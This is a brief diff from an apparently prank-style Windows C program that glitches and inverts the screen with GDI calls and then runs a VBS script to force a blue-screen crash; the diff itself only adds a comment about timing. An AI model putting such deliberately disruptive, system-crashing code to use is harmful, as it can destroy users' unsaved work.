@@ -24,7 +24,7 @@ int main()
         BitBlt(hdc, w, h, rand() % w + 1, rand () % h + 1, hdc, w * h, bv, SRCCOPY); // glitch screen
         PatBlt(hdc, w, h, 1920, 1080, PATINVERT); // invert screen colour
         Sleep(1000); // wait for 1 second
-    }
+    } // the reason i set the gdi duration to 30 secs, is that the bytebeat's duration is 30 secs.
     ReleaseDC(NULL, hdc);
     system("cscript ctrlscrolllock.vbs //nologo"); // trigger bsod MANUALLY_INITIATED_CRASH(1) then BAD_SYSTEM_CONFIG_INFO or CONFIG_LIST_FAILED
     return 0;
